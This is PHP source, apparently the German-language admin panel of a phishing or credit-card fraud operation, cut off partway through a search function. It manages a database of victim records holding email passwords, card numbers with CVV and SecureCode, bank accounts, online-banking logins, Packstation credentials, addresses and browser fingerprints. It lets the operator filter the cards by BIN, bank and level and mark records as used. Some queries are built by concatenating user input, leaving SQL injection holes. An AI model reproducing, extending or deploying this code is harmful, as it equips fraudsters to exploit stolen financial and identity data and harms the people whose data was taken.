<?php
	session_start();
	require_once("admin_config.php");

	if (!isset($_POST['submitAdminLogin']) && !isset($_POST['submitAdminLogout']) && !isset($_POST['showInfo']) && !isset($_POST['removeEntry']) && !isset($_POST['removeMarked']) && !isset($_POST['markAsUsed']) && !isset($_POST['markAsNotUsed']) && 
		!isset($_POST['searchMails']) && !isset($_POST['select_remove_logs']) && !isset($_POST['editComment']) && !isset($_POST['searchBin']) && !isset($_POST['select_cctyp']) && !isset($_POST['select_bank']) && !isset($_POST['searchCity']) &&
		!isset($_POST['select_level']) && !isset($_POST['select_cc_brand']) && !isset($_POST['convertDatabase']) && !isset($_POST['mark_shown_ccs']) && !isset($_POST['select_log_type']) && !isset($_POST['searchCCS']) && !isset($_POST['searchCCS_hours']) && 
		!isset($_POST['delete_shown_ccs']) && !isset($_POST['checkBlacklist']) && !isset($_POST['submitSettings']) && !isset($_POST['addNewCCData']) && !isset($_POST['remove_CC_Data']) && !isset($_POST['resetDomainStat'])) {
		
		if (isset($_SESSION['adminlogin']) && isset($_SESSION['adminUsername']) && isset($_SESSION['adminPassword'])) {
			if ($_SESSION['adminUsername'] == $adminUsername && $_SESSION['adminPassword'] == $adminPassword) {
				header("Location: " . $adminPanel);
			} else {
				header("Location: " . $adminPanelLogin);
			}
		} else {
			header("Location: " . $adminPanelLogin);
		}
	} else {
		if (isset($_POST['submitAdminLogin'])) {
			if ($_POST['adminUsername'] == $adminUsername && $_POST['adminPassword'] == $adminPassword) {
				$_SESSION['adminUsername'] = $_POST['adminUsername'];
				$_SESSION['adminPassword'] = $_POST['adminPassword'];
				$_SESSION['adminlogin'] = "success";
				$_SESSION['homeActive'] = "1";
				
				header("Location: " . $adminPanel);
			} else {
				$_SESSION['aErr'] = "1";
				header("Location: " . $adminPanelLogin);
			}		
		} else if (isset($_POST['submitAdminLogout'])) {
			session_destroy();
			header("Location: " . $adminPanelLogin);
			
		} else if (isset($_POST['convertDatabase'])) {
			convert_Database();
			header("Location: " . $adminPanelLogin);
			
		} else if (isset($_POST['removeEntry'])) {
		
			$removeID = $_POST['removeEntry'];
			$_SESSION['homeActive'] = "1";
			
			if (ctype_digit($removeID)) {
				$_SESSION['saveInfo'] = "Eintrag mit der #ID $removeID wurde erfolgreich entfernt.";
				
				remove($removeID);
				header("Location: " . $adminPanel . "#success");
			} else {
				header("Location: " . $adminPanel . "#failed");
			}
			
		} else if (isset($_POST['removeMarked']) || isset($_POST['markAsUsed']) || isset($_POST['markAsNotUsed'])) {
		
			$idArray = getCheckedIDs($_POST);
			$_SESSION['homeActive'] = "1";
			
			if (count($idArray) == 0) {
				$_SESSION['saveError'] = "Es wurden keine Eintr&auml;ge ausgew&auml;hlt.";
				
				header("Location: " . $adminPanel . "#failed");
				
			} else {
				if (isset($_POST['removeMarked'])) {
					for ($i = 0; $i < count($idArray); $i++) {
						remove($idArray[$i]);
					}
					
					$_SESSION['saveInfo'] = "Eintr&auml;ge (#ID's: " . join(", ", $idArray) . ") wurden erfolgreich entfernt.";
					header("Location: " . $adminPanel . "#success");
					
				} else if (isset($_POST['markAsUsed'])) {
					$ids = mark(1, $idArray);
					
					$_SESSION['saveInfo'] = "Eintr&auml;ge (#ID's: $ids) wurden als Benutzt markiert.";
					header("Location: " . $adminPanel . "#success");
					
				} else if (isset($_POST['markAsNotUsed'])) {
					$ids = mark(0, $idArray);
					
					$_SESSION['saveInfo'] = "Eintr&auml;ge (#ID's: $ids) wurden als Unbenutzt markiert.";
					header("Location: " . $adminPanel . "#success");
				}
			}
			
		} else if (isset($_POST['select_remove_logs'])) {
		
			$_SESSION['logsActive'] = "1";
			
			if ($_POST['select_remove_logs'] == 1) {
				$_SESSION['saveInfo'] = "Eintr&auml;ge ohne Kreditkarte / ELV wurden entfernt.";
				remove(null, false, false, true);
				
			} else if ($_POST['select_remove_logs'] == 2) {
				$_SESSION['saveInfo'] = "Eintr&auml;ge mit Kreditkarte wurden entfernt.";
				remove(null, false, true);
				
			} else if ($_POST['select_remove_logs'] == 3) {
				$_SESSION['saveInfo'] = "Eintr&auml;ge mit ELV wurden entfernt.";
				remove(null, false, false, false, true);
				
			} else if ($_POST['select_remove_logs'] == 4) {
				$_SESSION['saveInfo'] = "Datenbank wurde erfolgreich geleert.";
				remove(null, true);
				
			} else if ($_POST['select_remove_logs'] == 5) {
				$_SESSION['saveInfo'] = "Eintr&auml;ge nur mit Mail-Pass-Angabe wurden entfernt.";
				remove(null, false, false, false, false, true);
				
			} else if ($_POST['select_remove_logs'] == 6) {
				$_SESSION['saveInfo'] = "Eintr&auml;ge mit OB-Angabe wurden entfernt.";
				remove(null, false, false, false, false, false, true);
			}
			
			header("Location: " . $adminPanel . "#success");

		} else if (isset($_POST['searchBin'])) {
			unset($_SESSION['delete_shown_ccs_query']);
			$_SESSION['logsActive'] = "1";
			$bin = $_POST['tb_bin'];
			
			if (empty($bin)) {
				$_SESSION['saveError'] = "Bitte mindestens eine BIN eingeben!";
				header("Location: " . $adminPanel . "#failed");
			} else {
				$_SESSION['saveInfo'] = "Die BIN-Suche wurde erfolgreich durchgef&uuml;hrt.";
					
				$data = search($bin);
				$_SESSION['logs'] = $data[1];
				$_SESSION['searched'] = "Bin-Suche [ " . $_POST['tb_bin'] . " ] | Eintr&auml;ge: $data[0]";
				header("Location: " . $adminPanel . "#success");
			}
			
		} else if (isset($_POST['searchCity'])) {
			unset($_SESSION['delete_shown_ccs_query']);
			$_SESSION['logsActive'] = "1";
			$city = $_POST['tb_city'];

			if (!empty($city)) {
				$_SESSION['saveInfo'] = "Die Wohnort-Suche wurde erfolgreich durchgef&uuml;hrt.";
					
				$data = search(null, false, false, null, false, null, false, false, null, null, false, $city);
				$_SESSION['logs'] = $data[1];
				$_SESSION['searched'] = "Wohnort-Suche [ " . $_POST['tb_city'] . " ] | Eintr&auml;ge: $data[0]";
				header("Location: " . $adminPanel . "#success");
			} else {
				$_SESSION['saveError'] = "Bitte einen Wohnort eingeben!";
				header("Location: " . $adminPanel . "#failed");
			}
		
		} else if (isset($_POST['select_cc_brand']) && !empty($_POST['select_cc_brand'])) {
			unset($_SESSION['delete_shown_ccs_query']);
			
			$ccbrand = null;
			
			if ($_POST['select_cc_brand'] == 3) { 
				$ccbrand = "Amex"; 
			} else if ($_POST['select_cc_brand'] == 4) { 
				$ccbrand = "Visa"; 
			} else if ($_POST['select_cc_brand'] == 5) { 
				$ccbrand = "Mastercard"; 
			} else if ($_POST['select_cc_brand'] == 6) { 
				$ccbrand = "Amex/Visa/Mastercard";
			} else if ($_POST['select_cc_brand'] == 7) { 
				$ccbrand = "Amex/Visa/Mastercard (Bank sortiert)";
			}
			
			if ($_POST['select_cc_brand'] == 6) {
				$data = search(null, false, true);
			} else if ($_POST['select_cc_brand'] == 7) {
				$data = searchSorted();
			} else { 
				$data = search($_POST['select_cc_brand']);
			}
			
			$_SESSION['logsActive'] = "1";
			$_SESSION['saveInfo'] = "Die $ccbrand-Suche wurde erfolgreich durchgef&uuml;hrt.";
			$_SESSION['logs'] = $data[1];
			$_SESSION['searched'] = "$ccbrand-Suche | Eintr&auml;ge: $data[0]";
			header("Location: " . $adminPanel . "#success");
			
		} else if (isset($_POST['showInfo'])) {
			unset($_SESSION['delete_shown_ccs_query']);
			$showID = $_POST['showInfo'];
			$_SESSION['logsActive'] = "1";
			$_SESSION['searched'] = "#$showID";
			
			if (ctype_digit($showID)) {
				$_SESSION['logs'] =  search(null, false, false, $showID)[1];
				header("Location: " . $adminPanel . "#success");
			} else {
				header("Location: " . $adminPanel . "#failed");
			}
			
		} else if (isset($_POST['searchCCS'])) {
			unset($_SESSION['delete_shown_ccs_query']);
			$_SESSION['logsActive'] = "1";
			$cc_count = $_POST['tb_ccsearch'];
			
			if (ctype_digit($cc_count)) {
				$_SESSION['saveInfo'] = "Die Kreditkarten-Suche wurde erfolgreich durchgef&uuml;hrt.";
					
				$data = search(null, false, true, null, false, $cc_count);
				$_SESSION['logs'] = $data[1];

				$_SESSION['searched'] = "Kreditkarten-Suche [ ersten $cc_count St&uuml;ck ] | Eintr&auml;ge: $data[0]";
				header("Location: " . $adminPanel . "#success");
			} else {
				$_SESSION['saveError'] = "Bitte die zu suchende Anzahl eingeben!";
				header("Location: " . $adminPanel . "#failed");
			}
			
		} else if (isset($_POST['searchCCS_hours'])) {
			unset($_SESSION['delete_shown_ccs_query']);
			$_SESSION['logsActive'] = "1";
			$cc_hours = $_POST['tb_ccsearch'];
			
			if (ctype_digit($cc_hours)) {
				$_SESSION['saveInfo'] = "Die Kreditkarten-Suche wurde erfolgreich durchgef&uuml;hrt.";

				$data = search(null, false, true, null, false, $cc_hours, false, false, null, null, true);
				$_SESSION['logs'] = $data[1];

				$_SESSION['searched'] = "Kreditkarten-Suche [ CCs der letzten $cc_hours Stunden ] | Eintr&auml;ge: $data[0]";
				header("Location: " . $adminPanel . "#success");
			} else {
				$_SESSION['saveError'] = "Bitte einen Suchzeitraum in Stunden eingeben!";
				header("Location: " . $adminPanel . "#failed");
			}

		} else if (isset($_POST['select_log_type'])) {
			unset($_SESSION['delete_shown_ccs_query']);
			$_SESSION['logsActive'] = "1";
			
			$data = null;
			$count = $_POST['tb_search_pp_count'];
			
			if ($_POST['select_log_type'] == 1) {
				$data = search(null, true, false, null, false, null, false, false, null, null, false, null, false, null, false, null, null, true, $count);
				$_SESSION['searched'] = "Logs ohne CC - Full Info + ELV | Eintr&auml;ge: $data[0]";
				
			} else if ($_POST['select_log_type'] == 2) {
				$data = search(null, true, false, null, false, null, false, false, null, null, false, null, false, null, true, $count);
				$_SESSION['searched'] = "Logs ohne CC - Full Info | Eintr&auml;ge: $data[0]";
				
			} else if ($_POST['select_log_type'] == 3) {
				$data = search(null, false, true, null, true, $count);
				$_SESSION['searched'] = "Mail:Pass-Liste Logs mit CC | Eintr&auml;ge: $data[0]";
				
			} else if ($_POST['select_log_type'] == 4) {
				$data = search(null, true, false, null, true, null, false, false, null, null, false, null, false, null, false, null, null, true, $count);
				$_SESSION['searched'] = "Mail:Pass-Liste Logs ohne CC - Full Info + ELV | Eintr&auml;ge: $data[0]";
			
			} else if ($_POST['select_log_type'] == 5) {
				$data = search(null, true, false, null, true, null, false, false, null, null, false, null, false, null, true, $count);
				$_SESSION['searched'] = "Mail:Pass-Liste Logs ohne CC - Full Info | Eintr&auml;ge: $data[0]";
				
			} else if ($_POST['select_log_type'] == 6) {
				$data = search(null, true, false, null, true, null, false, false, null, null, false, null, true, $count);
				$_SESSION['searched'] = "Mail:Pass-Liste only | Eintr&auml;ge: $data[0]";
				
			} else if ($_POST['select_log_type'] == 7) {
				$data = search(null, true, false, null, true);
				$_SESSION['searched'] = "Mail:Pass-Liste alle | Eintr&auml;ge: $data[0]";
				
			} else if ($_POST['select_log_type'] == 8) {
				$data = search(null, true);
				$_SESSION['searched'] = "Alle Logs | Eintr&auml;ge: $data[0]";
				
			} else if ($_POST['select_log_type'] == 9) {
				$data = search(null, true, false, null, false, null, false, false, null, null, false, null, false, null, false, null, null, false, null, null, true, $count);
				$_SESSION['searched'] = "Alle Logs mit OB-Eintr&auml;gen | Eintr&auml;ge: $data[0]";
				
			} else if ($_POST['select_log_type'] == 10) {
				$data = search(null, true, false, null, false, null, false, false, null, null, false, null, false, null, false, null, null, false, null, null, false, null, true, $count);
				$_SESSION['searched'] = "Alle Logs mit Packstation-Eintr&auml;gen | Eintr&auml;ge: $data[0]";
			
			} else if ($_POST['select_log_type'] == 11) {
				$data = search(null, true, false, null, false, null, false, false, null, null, false, null, false, null, false, null, null, false, null, null, false, null, false, null, true, $count);
				$_SESSION['searched'] = "Logs mit CC - Nur Randoms | Eintr&auml;ge: $data[0]";
				
			} else if ($_POST['select_log_type'] == 12) {
				$data = search(null, true, false, null, false, null, false, false, null, null, false, null, true, $count);
				$_SESSION['searched'] = "Logs nur mit Mail:Pass | Eintr&auml;ge: $data[0]";
			}
			
			$_SESSION['logs'] =  $data[1];
			header("Location: " . $adminPanel . "#success");
			
		} else if (isset($_POST['editComment'])) {
			$id = $_POST['editComment'];
			$comment = $_POST['cm_' . $id];

			$edit = editComment($id, $comment);
			
			if ($edit == NULL) {
				$_SESSION['saveInfo'] = "Kommentar ($comment) f&uuml;r Eintrag #$id editiert.";
				header("Location: " . $adminPanel . "#success");
			} else {
				$_SESSION['saveError'] = $edit;
				header("Location: " . $adminPanel . "#failed");
			}
			
		} else if (isset($_POST['resetDomainStat'])) {
			$_SESSION['statsActive'] = "1";
			$domain = $_POST['resetDomainStat'];
			$resetDomainStat = resetDomainStat($domain);
			
			if ($resetDomainStat == NULL) {
				$_SESSION['saveInfo'] = "Stats für die Domain [$domain] zurückgesetzt.";
				header("Location: " . $adminPanel . "#success");
			} else {
				$_SESSION['saveError'] = $resetDomainStat;
				header("Location: " . $adminPanel . "#failed");
			}
		
		} else if (isset($_POST['submitSettings'])) {
			$_SESSION['settingsActive'] = "1";
			$saveSettings = saveSettings($_POST);
			
			if ($saveSettings == NULL) {
				$_SESSION['saveInfo'] = "Einstellungen erfolgreich gespeichert.";
				header("Location: " . $adminPanel . "#success");
			} else {
				$_SESSION['saveError'] = $saveSettings;
				header("Location: " . $adminPanel . "#failed");
			}
			
		} else if (isset($_POST['addNewCCData'])) {
			$_SESSION['settingsActive'] = "1";
			$addNewCCData = addNewCCData($_POST);
			
			if ($addNewCCData == NULL) {
				$_SESSION['saveInfo'] = "Neue Kreditkarten-Info eingespeichert.";
				header("Location: " . $adminPanel . "#success");
			} else {
				$_SESSION['saveError'] = $addNewCCData;
				header("Location: " . $adminPanel . "#failed");
			}
			
		} else if (isset($_POST['remove_CC_Data'])) {
			$_SESSION['settingsActive'] = "1";
			$addNewCCData = addNewCCData($_POST, true);
			
			if ($addNewCCData == NULL) {
				header("Location: " . $adminPanel . "#success");
			} else {
				$_SESSION['saveError'] = $addNewCCData;
				header("Location: " . $adminPanel . "#failed");
			}
		
		} else if (isset($_POST['delete_shown_ccs'])) {
			$_SESSION['logsActive'] = "1";
			
			if (strpos($_SESSION['delete_shown_ccs_query'], "FROM") !== false) {
				$query = "DELETE FROM " . explode("FROM", $_SESSION['delete_shown_ccs_query'])[1];

				$stmt = $mySQLcon->stmt_init();
			
				if (!$stmt ->prepare($query)) {
					die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
				}
			
				if (!$stmt->execute()) {
					die("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
				}
			
				$stmt ->close();
				$_SESSION['saveInfo'] = "Die ausgew&auml;hlten Eintr&auml;ge wurden erfolgreich entfernt.";
				
			} else {
				$idArray = explode("|", $_SESSION['delete_shown_ccs_query']);
				
				for ($i = 0; $i < count($idArray); $i++) {
					if (ctype_digit($idArray[$i])) {
					remove($idArray[$i]);
					}
				}
				$_SESSION['saveInfo'] = "Blacklist-Eintr&auml;ge (#ID's: " . join(", ", $idArray) . ") wurden erfolgreich entfernt.";
			}
			
			unset($_SESSION['delete_shown_ccs_query']);
			header("Location: " . $adminPanel . "#success");
		
		} else if (isset($_POST['mark_shown_ccs'])) {
			$_SESSION['logsActive'] = "1";
			if (strpos($_SESSION['delete_shown_ccs_query'], "WHERE") !== false) {
				$query = "UPDATE $myTable SET used=1 WHERE " . explode("WHERE", $_SESSION['delete_shown_ccs_query'])[1];

				$stmt = $mySQLcon->stmt_init();
			
				if (!$stmt ->prepare($query)) {
					die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
				}
			
				if (!$stmt->execute()) {
					die("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
				}
			
				$stmt ->close();
				$_SESSION['saveInfo'] = "Die ausgew&auml;hlten Eintr&auml;ge wurden erfolgreich als benutzt markiert.";
			}
			unset($_SESSION['delete_shown_ccs_query']);
			header("Location: " . $adminPanel . "#success");
		
		} else if (isset($_POST['checkBlacklist'])) {
			unset($_SESSION['delete_shown_ccs_query']);
			$_SESSION['logsActive'] = "1";
			
			$data = search(null, false, false, null, false, null, false, true);
			$_SESSION['logs'] =  $data[1];
			$_SESSION['searched'] = "Blacklist-Check | Eintr&auml;ge: $data[0]";
			
			header("Location: " . $adminPanel . "#success");
		
		} else if (isset($_POST['select_cctyp']) && !empty($_POST['select_cctyp'])) {
			unset($_SESSION['delete_shown_ccs_query']);
			$_SESSION['logsActive'] = "1";
			
			$cc_typ = $_POST['select_cctyp'];
			
			if (!empty($cc_typ)) {
				$data = search(null, false, false, null, false, null, false, false, $cc_typ);
				$_SESSION['logs'] =  $data[1];
				$_SESSION['searched'] = "Kreditkarten-Typ-Suche [" . $_POST['select_cctyp'] . "] | Eintr&auml;ge: $data[0]";
				
				header("Location: " . $adminPanel . "#success");
			} else {
				$_SESSION['saveError'] = "Bitte einen Kreditkarten-Typ ausw&auml;hlen!";
				header("Location: " . $adminPanel . "#failed");
			}

		} else if (isset($_POST['select_bank']) && !empty($_POST['select_bank'])) {
			unset($_SESSION['delete_shown_ccs_query']);
			$_SESSION['logsActive'] = "1";
			
			$cc_bank = $_POST['select_bank'];
			
			if (empty($cc_bank)) {
				$_SESSION['saveError'] = "Bitte eine Kreditkarten-Bank ausw&auml;hlen!";
				header("Location: " . $adminPanel . "#failed");
			} else {
				$data = search(null, false, false, null, false, null, false, false, null, $cc_bank);
				$_SESSION['logs'] =  $data[1];
				$_SESSION['searched'] = "Kreditkarten-Bank-Suche [" . $_POST['select_bank'] . "] | Eintr&auml;ge: $data[0]";
				
				header("Location: " . $adminPanel . "#success");
			}
			
		} else if (isset($_POST['select_level']) && !empty($_POST['select_level'])) {
			unset($_SESSION['delete_shown_ccs_query']);
			$_SESSION['logsActive'] = "1";
			
			$cc_level = $_POST['select_level'];
			
			if (empty($cc_level)) {
				$_SESSION['saveError'] = "Bitte ein Kreditkarten-Level ausw&auml;hlen!";
				header("Location: " . $adminPanel . "#failed");
			} else {
				$data = search(null, false, false, null, false, null, false, false, null, null, false, null, false, null, false, null, $cc_level);
				$_SESSION['logs'] =  $data[1];
				$_SESSION['searched'] = "Kreditkarten-Level-Suche [" . $_POST['select_level'] . "] | Eintr&auml;ge: $data[0]";
				
				header("Location: " . $adminPanel . "#success");
			}
		
		} else if (isset($_POST['searchMails'])) {
			unset($_SESSION['delete_shown_ccs_query']);
			$_SESSION['logsActive'] = "1";
			
			$mails_raw = explode("\r\n", $_POST['mailpasslist']);
			$data = search(null, true, false, null, false, null, false, false, null, null, false, null, false, null, false, null, null, false, null, $mails_raw);
			$_SESSION['logs'] =  $data[1];
			$_SESSION['searched'] = "Mail-Suche | Eintr&auml;ge: $data[0]";
			
			header("Location: " . $adminPanel . "#success");
		}
	}
	
	function editComment($id, $comment) {
		global $mySQLcon;
		global $myTable;
		
		$query = "UPDATE `" . $myTable . "` SET notiz=? WHERE id=?";

		$stmt = $mySQLcon->stmt_init();
	
		if (!$stmt ->prepare($query)) {
			return ("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}
	
		if (!$stmt ->bind_param("si", $comment, $id)) {
			return ("Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error);
		}
	
		if (!$stmt->execute()) {
			return ("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
		}

		$stmt ->close();
		
		return null;
	}
	
	function resetDomainStat($domain) {
		global $mySQLcon;
		global $myTable;
		
		$query = "UPDATE `" . $myTable . "` SET p_domain=? WHERE p_domain=?";

		$stmt = $mySQLcon->stmt_init();
	
		if (!$stmt ->prepare($query)) {
			return ("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}
	
		$clear = "";
		if (!$stmt ->bind_param("ss", $clear, $domain)) {
			return ("Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error);
		}
	
		if (!$stmt->execute()) {
			return ("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
		}

		$stmt ->close();
		
		return null;
	}
	
	function getAvailableBanks() {
		global $mySQLcon;
		global $myTable;
		
		$query = 'SELECT `bank` FROM ' . $myTable .' WHERE ccnr != "N / A" AND ccnr != "skipped" ORDER by `id`';

		$array_bank = array();
		
		if (!($stmt = $mySQLcon->prepare($query))) {
			die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}

		if (!$stmt->execute()) {
			die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}
		
		if (!$stmt->bind_result($out_bank)) {
			die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
		}
		
		$out_bank = NULL;

		while ($stmt->fetch()) {
			if (!empty($out_bank)) {
				$array_bank[] .= $out_bank;
			}
		}

		$stmt->close();
		
		return (array_keys(array_flip($array_bank)));
	}
	
	function searchSorted() {
		global $mySQLcon;
		global $myTable;
		
		$result = '';
		$count = 0;
		
		$array_banks = getAvailableBanks();
		
		for ($i = 0; $i < count($array_banks); $i++) {
			$result .= ">>> LOGS VON [$array_banks[$i]]----------------------------------------------------------------------------------------------------<br/><br/>";
			
			$query = 'SELECT 
									`id`, `logtime`, `username`, `passwort`, 
									`vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `tlfnr`, `handynr`, `ps_nr`, `ps_pw`,
									`ccnr`, `ccdate`, `cvv`, `cclimit`, `securecode`, `servicekartennummer`, `notiz`,
									`kto`, `blz`, `iban`, `bic`, `ob_login`, `ob_pass`,
									`brand`, `bank`, `country`, `category`, `binlevel`,
									`p_domain`, `useragent`, `ip`, `used` 
							FROM ' . $myTable . ' WHERE ccnr != "N / A" AND ccnr != "skipped" AND `bank` LIKE "' . $array_banks[$i] . '"';
			
			
			if (!($stmt = $mySQLcon->prepare($query))) {
				die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
			}

			if (!$stmt->execute()) {
				die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
			}

			$out_id = NULL;
			$out_time = NULL;
			
			$out_user = NULL;
			$out_pass = NULL;
			$out_vorname = NULL;
			$out_nachname = NULL;
			$out_dob = NULL;
			$out_adresse = NULL;
			$out_plz = NULL;
			$out_ort = NULL;
			$out_tlfnr = NULL;
			$out_handynr = NULL;
			
			$out_ps_nr = NULL;
			$out_ps_pw = NULL;
			
			$out_ccnr = NULL;
			$out_ccdate = NULL;
			$out_cvv = NULL;
			$out_limit = NULL;
			
			$out_sc = NULL;
			$out_sk = NULL;
			
			$out_notiz = NULL;
			
			$out_kto = NULL;
			$out_blz = NULL;
			$out_iban = NULL;
			$out_bic = NULL;
			
			$out_ob_user = NULL;
			$out_ob_pass = NULL;
		
			$out_brand = NULL;
			$out_bank2 = NULL;
			$out_country = NULL;
			$out_category = NULL;
			$out_level = NULL;
			
			$out_domain = NULL;
			
			$out_useragent = NULL;
			$out_ip = NULL;
			
			$out_used = NULL;
			
			if (!$stmt->bind_result($out_id, $out_time, $out_user, $out_pass, 
												 $out_vorname, $out_nachname, $out_dob, $out_adresse, $out_plz, $out_ort, $out_tlfnr, $out_handynr, $out_ps_nr, $out_ps_pw,
												 $out_ccnr, $out_ccdate, $out_cvv, $out_limit, $out_sc, $out_sk, $out_notiz,
												 $out_kto, $out_blz, $out_iban, $out_bic, $out_ob_user, $out_ob_pass,
												 $out_brand, $out_bank2, $out_country, $out_category, $out_level,
												 $out_domain, $out_useragent, $out_ip, $out_used)) {
												 
				die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
			}
			

			while ($stmt->fetch()) {
				$count++;
					
				$result .= '
								<b>#ID</b>: ' . $out_id  . '<br/>
								<b>Datum</b>: ' . $out_time  . '<br/>
								<br/>
								<b>E-Mail</b>: ' . htmlspecialchars($out_user)  . '<br/>
								<b>Passwort</b>: ' . htmlspecialchars($out_pass)  . '<br/>
								<br/>
								<b>Vorname</b>: ' . htmlspecialchars($out_vorname)  . '<br/>
								<b>Nachname</b>: ' . htmlspecialchars($out_nachname)  . '<br/>
								<b>Geburtsdatum</b>: ' . htmlspecialchars($out_dob)  . '<br/>
								<b>Adresse</b>: ' . htmlspecialchars($out_adresse)  . '<br/>
								<b>Postleitzahl</b>: ' . htmlspecialchars($out_plz)  . '<br/>
								<b>Wohnort</b>: ' . htmlspecialchars($out_ort)  . '<br/>
								<b>Telefonnummer</b>: ' . htmlspecialchars($out_tlfnr)  . '<br/>
								<b>Handynummer</b>: ' . htmlspecialchars($out_handynr)  . '<br/>
								<br/>
								<b>Packstation PostNummer</b>: ' . htmlspecialchars($out_ps_nr)  . '<br/>
								<b>Packstation Passwort</b>: ' . htmlspecialchars($out_ps_pw)  . '<br/>
								<br/>
								<b>Kreditkartennummer</b>: ' . htmlspecialchars($out_ccnr)  . '<br/>
								<b>G&uuml;ltigkeit</b>: ' . str_replace(".", " / ", $out_ccdate)  . '<br/>
								<b>Pr&uuml;fziffer</b>: ' . htmlspecialchars($out_cvv)  . '<br/>
								<br/>
								<b>Limit</b>: ' . htmlspecialchars($out_limit)  . '<br/>
								<br/>
								<b>Securecode</b>: ' . htmlspecialchars($out_sc)  . '<br/>
								<b>Servicekartennummer</b>: ' . htmlspecialchars($out_sk)  . '<br/>
								<br/>
								<b>Notiz</b>: ' . htmlspecialchars($out_notiz)  . '<br/>
								<br/>
								<b>Kontonummer</b>: ' . htmlspecialchars($out_kto)  . '<br/>
								<b>Bankleitzahl</b>: ' . htmlspecialchars($out_blz)  . '<br/>
								<br/>
								<b>IBAN</b>: ' . htmlspecialchars($out_iban)  . '<br/>
								<b>BIC</b>: ' . htmlspecialchars($out_bic)  . '<br/>
								<br/>
								<b>OB-Login</b>: ' . htmlspecialchars($out_ob_user)  . '<br/>
								<b>OB-Pass</b>: ' . htmlspecialchars($out_ob_pass)  . '<br/>
								<br/>
								<b>Marke</b>: ' . htmlspecialchars($out_brand)  . '<br/>
								<b>Bank</b>: ' . htmlspecialchars($out_bank2)  . '<br/>
								<b>Land</b>: ' . htmlspecialchars($out_country)  . '<br/>
								<b>Kategorie</b>: ' . htmlspecialchars($out_category)  . '<br/>
								<b>Level</b>: ' . htmlspecialchars($out_level)  . '<br/>
								<br/>
								<b>Useragent</b>: ' . $out_useragent  . '<br/>
								<b>IP-Adresse</b>: ' . $out_ip  . '<br/>
								<br/>
								<b>Benutzt?</b>: ' . (($out_used == 0) ? "N" : "Y")  . '<br/>
								-------------------------------------------------------------------------------------------------------------------------------------<br/>';
			}

			$stmt->close(); 
			
			$result .= "################################################################################################<br/><br/>";
		}
		
		if (empty($result)) {
			$result = "N / A";
		}
		
		return array($count, $result);
	}

	function search($bin, $searchAll = false, $searchCC = false, $showID = null, $searchMailPass = false, $cc_count = null, $showNoCC = false, $checkBlacklist = false, $cctyp = null, $bank = null, $hour = false, $city = null, $mp_search = false, 
							$mp_count = null, $fi_search = false, $fi_count = null, $level = null, $elv_search = false, $elv_count = null, $search_for_mails = null, $ob_search = false, $ob_count = null, $ps_search = false, $ps_count = null, $random_search = false, $random_count = null) {
		global $mySQLcon;
		global $myTable;
		global $badWords;
		global $show_vic_infos;
		
		$result = '';
		$count = 0;
		$mark_used_id_array = array();
		
		$query = 'SELECT 
								`id`, `logtime`, `username`, `passwort`, 
								`vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `tlfnr`, `handynr`, `ps_nr`, `ps_pw`,
								`ccnr`, `ccdate`, `cvv`, `cclimit`, `securecode`, `servicekartennummer`, `notiz`,
								`kto`, `blz`, `iban`, `bic`, `ob_login`, `ob_pass`, 
								`brand`, `bank`, `country`, `category`, `binlevel`,
								vic_info_lang, vic_info_browser, vic_info_os, vic_info_screen, vic_info_plugins, vic_info_java, vic_info_flash, vic_info_silver, vic_info_mime, vic_info_fonts,
								`p_domain`, `useragent`, `ip`, `used` 
						FROM ' . $myTable;
		
		if ($searchCC) {
			$query .= ' WHERE ccnr != "N / A" AND ccnr != "skipped"';
			
			if ($cc_count != null) {
				if ($hour) {
					$search_time = time() - ($cc_count*60*60);
					$query .= " AND `logtime_timestamp` > $search_time";
				} else {
					$query .= " LIMIT $cc_count";
				}
			}
			
		} else if ($searchAll) {
			if ($showNoCC) {
				$query .= ' WHERE ccnr LIKE "N / A" OR ccnr LIKE "skipped"';
			}
			
			if ($mp_search) {
				$query .= ' WHERE vorname LIKE "N / A" AND `used` LIKE "0"';
				if (ctype_digit($mp_count)) { 
					$query .= ' LIMIT ' . $mp_count;
				}
			}
			
			if ($fi_search) {
				$query .= ' WHERE ccnr LIKE "N / A" AND vorname != "N / A" AND `used` LIKE "0"';
				if (ctype_digit($fi_count)) { 
					$query .= ' LIMIT ' . $fi_count;
				}
			}
			
			if ($elv_search) {
				$query .= ' WHERE ccnr LIKE "skipped" AND vorname != "N / A" AND ob_login LIKE "N / A" AND `used` LIKE "0"';
				if (ctype_digit($elv_count)) { 
					$query .= ' LIMIT ' . $elv_count;
				}
			}
			
			if ($ps_search) {
				$query .= ' WHERE ps_nr != "N / A" AND ps_nr != ""';
				if (ctype_digit($ps_count)) { 
					$query .= ' LIMIT ' . $ps_count;
				}
			}
			
			if ($random_search) {
				$query .= ' WHERE ccnr != "N / A" AND ccnr != "skipped" AND securecode LIKE "N / A" OR securecode LIKE "non regged" OR securecode LIKE "mTAN Bin - SC skip" OR securecode LIKE ""';
				if (ctype_digit($random_count)) { 
					$query .= ' LIMIT ' . $random_count;
				}
			}
			
			if ($ob_search) {
				$query .= ' WHERE ccnr LIKE "skipped" AND ob_login != "N / A" AND `used` LIKE "0"';
				if (ctype_digit($ob_count)) { 
					$query .= ' LIMIT ' . $ob_count;
				}
			}

			if ($search_for_mails != null) {
				$query .= " WHERE `username` IN (\"". implode("\", \"", $search_for_mails) ."\")";
			}
			
		} else if ($showID != null) {
			$query .= " WHERE id = $showID";
			
		} else if ($checkBlacklist) {
